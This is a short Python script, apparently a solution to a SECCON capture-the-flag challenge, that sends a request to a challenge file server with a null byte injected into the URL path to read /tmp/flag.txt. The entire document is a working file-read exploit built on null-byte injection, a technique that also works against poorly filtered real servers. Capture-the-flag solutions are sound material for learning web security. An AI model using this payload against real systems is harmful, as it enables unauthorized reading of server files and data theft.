import requests

url = "http://fileserver.chal.seccon.jp:9292/\x00/tmp/flag.txt"

res = requests.get(url)

print(res.text)